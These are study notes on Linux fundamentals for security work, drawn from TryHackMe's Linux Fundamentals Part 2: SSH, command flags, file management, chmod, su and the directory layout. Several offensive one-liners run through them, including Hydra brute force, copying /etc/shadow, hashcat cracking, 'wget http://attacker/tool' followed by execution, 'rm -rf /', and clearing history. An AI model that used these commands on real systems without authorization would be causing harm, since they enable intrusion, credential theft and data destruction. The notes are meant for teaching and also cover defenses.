# 🐧 Linux Fundamentals Part 2 — SSH, Flags, Files, Permissions & Filesystem

> **Source:** TryHackMe — Linux Fundamentals Part 2
> **Purpose:** Intermediate Linux CLI mastery for cybersecurity
> **Covers:** SSH remote access, command flags, man pages, file
> management (cp/mv/rm/touch/mkdir), permissions (chmod), su,
> Linux directory structure and high-value targets

---

## 🧒 Feynman Explanation — Linux as an Attacker's Toolkit

Imagine you're a locksmith hired to test a building's security.
You need to:

1. **Get inside** (SSH — the encrypted tunnel in)
2. **Read the blueprint** (man pages — understand your tools)
3. **Move evidence around** (cp, mv, touch, mkdir — file management)
4. **Know which doors you can open** (permissions — the core of hacking)
5. **Know where the vault is** (directory structure — where secrets live)

Every section below is one of those skills.

---

## 🔷 I. Remote Access — SSH (The Gateway)

### 🧒 Feynman Explanation

SSH is like a locked, soundproofed phone call to a remote computer.
Old Telnet was like shouting across an open room — everyone heard
your password. SSH encrypts everything so even if someone intercepts
the connection, they see encrypted gibberish, not your commands.

### How SSH Works

```
Your Machine                          Remote Machine
     │                                      │
     │──── Encrypted tunnel (port 22) ────▶│
     │         (AES-256 encryption)         │
     │◀─── Encrypted responses ────────────│
     │                                      │
Nobody between you can read any of this.
Old Telnet: everything in plain text — anyone sniffing sees passwords!
```

### SSH Command Structure

```bash
# Basic syntax
ssh [username]@[IP_Address]

# Examples
ssh sammie@10.48.188.49
ssh root@192.168.1.1
ssh admin@tryhackme.com

# Custom port (not port 22)
ssh -p 2222 user@server.com

# Connect with specific private key file
ssh -i ~/.ssh/id_rsa user@server.com

# Verbose mode (debug connection issues)
ssh -v user@server.com
```

### The Fingerprint (Host Verification)

```bash
# First connection warning:
The authenticity of host '10.48.188.49' can't be established.
ECDSA key fingerprint is SHA256:IFP+sTfHTDm72Ta2zfK9XjKASr30+ya4ic/ApEIziio.
Are you sure you want to continue connecting (yes/no)? yes

# Why this matters:
# This prevents Man-in-the-Middle attacks
# If someone intercepts your connection and presents a FAKE server,
# the fingerprint WON'T MATCH the real server's fingerprint
# → Always verify fingerprints on first connection!

# Where accepted fingerprints are stored:
cat ~/.ssh/known_hosts
# One line per trusted server

# If fingerprint CHANGES on reconnect → BIG RED FLAG
# Could mean: server was reinstalled, OR you're being MITM'd
```

### The Invisible Password (Security Feature)

```bash
sammie@10.48.188.49's password: [nothing appears as you type]

# Why no asterisks?
# If you saw ****** you'd know the PASSWORD LENGTH
# Attackers watching your screen ("shoulder surfing") get zero info
# The system still receives every character — just not displayed
```

### SSH Security Notes

```
Port 22 is the DEFAULT — first thing attackers scan for.
Hardening SSH (common in production):
  ✅ Change default port (e.g., 2222) — slows automated scans
  ✅ Disable root login (PermitRootLogin no in /etc/ssh/sshd_config)
  ✅ Use key-based auth instead of passwords
  ✅ Whitelist specific IPs (AllowUsers user@192.168.1.*)
  ✅ Enable MFA (2FA on SSH)
  ✅ Use fail2ban (auto-bans IPs after failed attempts)

Pentesting with SSH:
  Nmap scan:    nmap -p 22 --script ssh-brute target.com
  Hydra attack: hydra -l admin -P rockyou.txt ssh://target.com
```

---

## 🔷 II. Advanced Command Control — Flags & Man Pages

### 🧒 Feynman Explanation

A command without flags is like ordering "coffee." A command
WITH flags is "large iced oat milk latte with an extra shot."
Flags customize the behavior precisely. `man` is the barista's
manual — it lists every possible customization.

### Command Anatomy

```
ls  -a  /home/ubuntu
│    │   └── argument (what to act on)
│    └── flag/switch (how to behave)
└── command (what to do)

More examples:
find  /  -name  "*.txt"  -type  f
│     │   │      │         │     └── value
│     │   │      │         └── flag
│     │   │      └── value
│     │   └── flag
│     └── argument
└── command
```

### Common Flags You MUST Know

```bash
# ls flags
ls -a         # show ALL files (including hidden .dotfiles)
ls -l         # long format (permissions, owner, size, date)
ls -la        # BOTH — most used in security work
ls -lh        # human-readable sizes (KB, MB, GB)
ls -lt        # sort by time (newest first)
ls -lS        # sort by size (largest first)
ls -R         # recursive (show all subdirectories)

# find flags
find / -name    # search by name
find / -type f  # files only
find / -type d  # directories only
find / -perm    # search by permissions
find / -user    # search by owner
find / -mtime   # search by modification time
find / -size    # search by file size

# grep flags
grep -i    # case insensitive
grep -r    # recursive (search all subdirectories)
grep -n    # show line numbers
grep -v    # invert (show NON-matching lines)
grep -c    # count matches
grep -l    # show only filenames with matches
```

### The `man` Command — Your Encyclopedia

```bash
# Read the manual for any command
man ls
man find
man grep
man chmod
man ssh

# Inside man pages:
# Scroll:    arrow keys or j/k (vim navigation)
# Search:    /keyword then Enter → jumps to first match
#            n → next match
#            N → previous match
# Exit:      q

# Examples:
man ls        # then type /recursive → jumps to recursive section
man find      # then type /mtime → jumps to time-based search
man chmod     # then type /sticky → jumps to sticky bit section

# Quick flag lookup without full man page
ls --help
find --help
ssh --help

# tldr — simplified man pages (install separately)
# tldr ls       → shows most common examples only
```

---

## 🔷 III. File Management — Building Your Environment

### Touch & Mkdir — Creating Things

```bash
# touch — create an empty file OR update file timestamp
touch newfile.txt
touch exploit.sh
touch .hidden_backdoor    # starts with dot = hidden!

# Touch multiple files at once
touch file1.txt file2.txt file3.txt

# mkdir — create a directory
mkdir tools
mkdir /tmp/workdir

# mkdir -p — create NESTED directories in ONE command
mkdir -p /tmp/pentest/loot/passwords
# Creates:  /tmp/
#           /tmp/pentest/
#           /tmp/pentest/loot/
#           /tmp/pentest/loot/passwords/
# Without -p: would fail if parent dirs don't exist

# Pentest workflow:
mkdir -p /tmp/pentest/{tools,loot,scripts,evidence}
# Creates 4 subdirectories at once using brace expansion
```

### `cp` — Copy (Backup Before You Touch)

```bash
# Basic syntax
cp [source] [destination]

# Copy a file
cp passwords.txt passwords.txt.bak    # backup before editing!
cp /etc/passwd /tmp/passwd.bak        # backup system file

# Copy a directory (-r for recursive)
cp -r /var/log /tmp/log_backup/

# Copy with verbose output (see what's happening)
cp -v important.txt backup.txt

# Critical security habit:
# ALWAYS backup sensitive files before modification
# cp /etc/sudoers /etc/sudoers.bak
# cp /etc/passwd /tmp/passwd.original
# If you break it → restore from backup!

# Pentest use:
cp /etc/passwd /tmp/loot/passwd       # exfiltrate for analysis
cp /etc/shadow /tmp/loot/shadow       # hash extraction!
```

### `mv` — Move AND Rename

```bash
# Move a file to a different directory
mv file.txt /tmp/

# Rename a file (Linux has NO "rename" command — mv does both!)
mv oldname.txt newname.txt
mv suspicious.sh .hidden_suspicious.sh  # rename to hide it!

# Move and rename simultaneously
mv original.txt /tmp/loot/renamed.txt

# Move multiple files
mv file1.txt file2.txt file3.txt /destination/

# Pentest use:
mv exploit.sh .exploit.sh    # hide by adding dot prefix
mv tool /usr/local/bin/tool  # install tool to PATH
```

### `rm` — Remove (NO RECYCLE BIN!)

```bash
# Remove a single file — PERMANENT, NO UNDO
rm file.txt

# Remove a directory and its contents
rm -r folder/

# Force removal (no confirmation prompts)
rm -f locked_file.txt

# Recursive + Force (EXTREMELY DANGEROUS)
rm -rf folder/

# THE MOST DANGEROUS COMMAND IN LINUX:
rm -rf /
# Recursively + forcefully deletes EVERYTHING from root
# Wipes the entire OS — no recovery without backup
# Some systems have a --no-preserve-root safety guard

# Safer alternatives:
rm -ri folder/   # -i = interactive, asks before each deletion
ls folder/ | wc -l   # count files first before deleting

# Pentest use:
rm -rf /tmp/pentest/    # clean up after yourself (cover tracks)
shred -vfz -n 3 file   # securely delete (overwrites 3 times)
```

### File Management Summary Table

| Command         | What It Does                         | Security Use                        |
| --------------- | ------------------------------------ | ----------------------------------- |
| `touch file`    | Create empty file / update timestamp | Create placeholders, scripts        |
| `mkdir -p path` | Create nested directories            | Set up pentest workspace            |
| `cp src dst`    | Copy file                            | Backup before modifying, exfiltrate |
| `mv src dst`    | Move or rename                       | Rename to hide, install to PATH     |
| `rm file`       | Delete file permanently              | Clean up tools after pentest        |
| `rm -rf dir`    | Delete directory recursively         | Nuclear option — careful!           |

---

## 🔷 IV. Permissions — The Core of Hacking

### 🧒 Feynman Explanation

Every file in Linux has a bouncer checking three things:

1. **Read** — can you SEE inside?
2. **Write** — can you CHANGE it?
3. **Execute** — can you RUN it?

And the bouncer checks THREE different guest lists:

1. **Owner** — the file's creator (most trusted)
2. **Group** — a team of users (medium trust)
3. **Others** — everyone else (least trusted)

Weak permissions = bouncer fell asleep = attacker walks right in.

### Reading Permission Strings

```
-rwxr-xr--  1  alice  developers  4096  Dec 11  file.sh
│└┬┘└┬┘└┬┘  │  │      │           │
│ │  │  │   │  │      └── group owner
│ │  │  │   │  └── user/file owner
│ │  │  │   └── number of links
│ │  │  └── OTHERS permissions: r-- (read only)
│ │  └── GROUP permissions: r-x (read + execute)
│ └── OWNER permissions: rwx (full access)
└── file type: - = file, d = directory, l = symlink
```

### The "Big Three" — Read, Write, Execute

```
r = Read    = 4   → can view file contents / list directory
w = Write   = 2   → can modify file / create files in directory
x = Execute = 1   → can run as program / navigate into directory

Combinations (add the numbers):
  rwx = 4+2+1 = 7   Full control
  rw- = 4+2+0 = 6   Read and write
  r-x = 4+0+1 = 5   Read and execute (standard for scripts)
  r-- = 4+0+0 = 4   Read only
  -wx = 0+2+1 = 3   Write and execute (unusual)
  -w- = 0+2+0 = 2   Write only (unusual)
  --x = 0+0+1 = 1   Execute only (unusual)
  --- = 0+0+0 = 0   No permissions
```

### `chmod` — Change Permissions

```bash
# Octal notation: chmod [owner][group][others] file
chmod 755 script.sh
# 7 = rwx (owner has full control)
# 5 = r-x (group can read and run)
# 5 = r-x (others can read and run)
# Standard for executable scripts

chmod 644 document.txt
# 6 = rw- (owner can read/write)
# 4 = r-- (group can only read)
# 4 = r-- (others can only read)
# Standard for regular files

chmod 600 private_key.pem
# 6 = rw- (owner can read/write)
# 0 = --- (group has NO access)
# 0 = --- (others have NO access)
# Standard for SSH private keys, passwords

chmod 777 file
# EVERYONE has full access — DANGEROUS!
# ⚠️ World-writable = attacker can modify or execute!

# Common secure permission sets:
chmod 700 ~/.ssh/          # your SSH directory
chmod 600 ~/.ssh/id_rsa    # your private key
chmod 644 ~/.ssh/id_rsa.pub # your public key
chmod 755 /usr/local/bin/tool # executable tool

# Symbolic notation alternative
chmod u+x script.sh    # add execute for owner
chmod g-w file.txt     # remove write from group
chmod o-r secret.txt   # remove read from others
chmod a+r public.txt   # add read for ALL (a = all)
```

### Permission Table — Security Quick Reference

| Octal | String    | Security Meaning                        |
| ----- | --------- | --------------------------------------- |
| 777   | rwxrwxrwx | ⚠️ DANGEROUS — everyone has full access |
| 755   | rwxr-xr-x | Standard executable — safe              |
| 644   | rw-r--r-- | Standard file — safe                    |
| 600   | rw------- | Private — only owner reads/writes       |
| 700   | rwx------ | Private executable — only owner runs    |
| 400   | r-------- | Read-only, maximum protection           |

### Finding Dangerous Permissions

```bash
# Find SUID files (run as file OWNER, not current user!)
find / -perm -4000 2>/dev/null
# If owned by root + SUID = runs as ROOT even if YOU run it
# This is a COMMON privilege escalation path!
# Check each result on GTFObins.github.io

# Find world-writable files (anyone can modify)
find / -perm -o+w -type f 2>/dev/null
# If /etc/passwd is here → add a root user!

# Find world-writable directories
find / -perm -o+w -type d 2>/dev/null
# /tmp is intentionally world-writable

# Find files with no owner (orphaned — suspicious!)
find / -nouser 2>/dev/null
```

### `su` — Switch User (Lateral Movement)

```bash
# Switch to another user
su johnny
# Then enter johnny's password

# Switch with full environment (-l or -)
su -l linda
su - linda
# This loads linda's PATH, environment variables, and starts
# from linda's home directory — simulates full login

# Switch to root (if you know root's password)
su -
su - root

# Why -l matters:
# su johnny    → your PATH + johnny's account
# su -l johnny → johnny's COMPLETE environment
# For pentesting: always use -l to get the full picture
# Some tools only work if they're in the user's specific PATH

# Check current user after switching
whoami
id
```

---

## 🔷 V. Linux Directory Structure — The Map of High-Value Targets

### 🧒 Feynman Explanation

Linux's filesystem is like a building. You need to know which
rooms hold what valuables before you start searching. Here's
the floor plan every security professional must memorize.

### The High-Value Target Map

```
/
├── etc/          🔑 THE CONFIGURATION VAULT
│   ├── passwd    → ALL user accounts (no passwords, but usernames!)
│   ├── shadow    → PASSWORD HASHES (root only — crack with hashcat!)
│   ├── sudoers   → who can run what as sudo (CRITICAL!)
│   ├── hosts     → local DNS entries
│   ├── crontab   → scheduled tasks (persistence location!)
│   └── ssh/      → SSH server config
│
├── var/          📊 VARIABLE DATA
│   ├── log/      🗂️ THE EVIDENCE ROOM — ALL system logs live here
│   │   ├── auth.log       → login attempts, SSH, sudo usage
│   │   ├── syslog         → general system events
│   │   ├── kern.log       → kernel messages
│   │   └── apache2/       → web server access and error logs
│   └── www/      → web application files
│
├── root/         👑 THE ULTIMATE GOAL — Superuser's home
│   └── [root's personal files, often SSH keys, scripts]
│
├── home/         👤 ALL user home directories
│   └── username/
│       ├── .bash_history  → GOLD — their command history!
│       ├── .ssh/          → SSH keys!
│       └── [personal files]
│
├── tmp/          🎯 THE HACKER'S PLAYGROUND
│   └── [world-writable — ANYONE can create files here]
│       → Upload exploit scripts here
│       → Store loot temporarily here
│       → Compile exploits here
│
├── bin/          → Essential user binaries (ls, cat, grep)
├── sbin/         → System admin binaries (fdisk, iptables)
├── usr/
│   ├── bin/      → User programs
│   └── local/bin/→ Manually installed tools
├── proc/         → Live process info (/proc/[PID]/cmdline)
└── dev/          → Device files (/dev/sda = hard drive)
```

### Why `/tmp` Is the Hacker's Playground

```
/tmp characteristics:
  ✅ World-writable (every user can create files)
  ✅ Exists on EVERY Linux system
  ✅ Usually not closely monitored
  ✅ No execute prevention by default (most systems)
  ✅ Survives login sessions

Typical pentest workflow:
  1. Get initial shell access (via exploit or SSH)
  2. cd /tmp                    → go to working directory
  3. wget http://attacker/tool  → download exploit
  4. chmod +x tool              → make it executable
  5. ./tool                     → run exploit
  6. rm -rf /tmp/tool           → clean up
```

### Critical Files for Security

```bash
# /etc/passwd — user enumeration
cat /etc/passwd
# Format: username:x:uid:gid:comment:home:shell
# Look for:
#   UID 0 = another root account → BACKDOOR!
#   /bin/bash shells = interactive login possible
#   Accounts you don't recognize = suspicious

# Filter for users with login shells
grep "/bin/bash\|/bin/sh" /etc/passwd

# /etc/shadow — password hashes (if readable!)
cat /etc/shadow
# Format: username:$6$salt$hash:...
# $6$ = SHA-512 (strong)
# $1$ = MD5 (weak — crack fast!)
# Crack with: hashcat -m 1800 shadow.txt rockyou.txt

# /etc/sudoers — who has what sudo access
sudo cat /etc/sudoers
# (user) ALL=(ALL:ALL) ALL → this user is basically root!
# Check current user's sudo rights:
sudo -l

# ~/.bash_history — what have they been doing?
cat ~/.bash_history
cat /home/johnny/.bash_history
# May reveal: passwords in commands, other servers, internal IPs
```

---

## 🔷 VI. The Real-World Pentest Workflow (Full Synthesis)

```bash
# ── STEP 1: GAIN ACCESS ───────────────────────────────────────────
ssh sammie@10.48.188.49
# Enter found/guessed password

# ── STEP 2: ORIENT YOURSELF ───────────────────────────────────────
whoami           # who am I?
id               # what groups/privileges?
pwd              # where am I?
ls -la           # what's in my current directory?
cat ~/.bash_history   # what has this user done before?

# ── STEP 3: SET UP WORKSPACE ──────────────────────────────────────
cd /tmp
mkdir -p pentest/{loot,tools,scripts}
ls -la /tmp/pentest/

# ── STEP 4: LOOK FOR INTERESTING PERMISSIONS ──────────────────────
find / -perm -4000 2>/dev/null      # SUID binaries
find / -perm -o+w -type f 2>/dev/null  # world-writable files
sudo -l                              # what can I run as sudo?

# ── STEP 5: GATHER LOOT ───────────────────────────────────────────
cp /etc/passwd /tmp/pentest/loot/
cat /etc/passwd | grep "/bin/bash"   # find all shell users

# If shadow is readable (misconfigured!):
cp /etc/shadow /tmp/pentest/loot/

# Check SSH keys
ls -la ~/.ssh/
ls -la /root/.ssh/ 2>/dev/null

# ── STEP 6: LATERAL MOVEMENT ──────────────────────────────────────
# Switch to other discovered users
su - johnny      # try common passwords
su - linda       # try same password as sammie (reuse!)
su - root        # try if root password was found

# ── STEP 7: CHECK LOGS (AVOID DETECTION) ──────────────────────────
cat /var/log/auth.log | grep "sammie"   # what's logged?
# Consider clearing your tracks (controversial in authorized tests)

# ── STEP 8: CLEAN UP (AUTHORIZED PENTEST) ─────────────────────────
rm -rf /tmp/pentest/    # remove working directory
history -c              # clear session history
```

---

## 🔗 Security Attack Map — Full Reference

| Concept                | Attack Use                          | Defense                                   |
| ---------------------- | ----------------------------------- | ----------------------------------------- |
| SSH default port 22    | Automated scanning + brute force    | Change port, disable root login, use keys |
| `ls -la` hidden files  | Find attacker backdoors in dotfiles | Monitor filesystem changes                |
| `/tmp` world-writable  | Upload and execute exploit code     | Mount /tmp with noexec flag               |
| SUID binaries          | Privilege escalation                | Audit SUID files regularly                |
| `/etc/shadow` readable | Offline hash cracking               | chmod 640 shadow (root+shadow group only) |
| `su -l user`           | Lateral movement between accounts   | Principle of least privilege, MFA         |
| `rm -rf /tmp/tools`    | Attacker covers tracks              | Immutable logging, SIEM alerts            |
| `chmod 777 file`       | Anyone can modify/execute           | Regular permission audits                 |
| `~/.bash_history`      | Credential discovery in history     | `HISTCONTROL=ignorespace`, log monitoring |

---

_Notes compiled from TryHackMe — Linux Fundamentals Part 2_
_Enriched with real pentest workflows, security context, and attack/defense mapping_
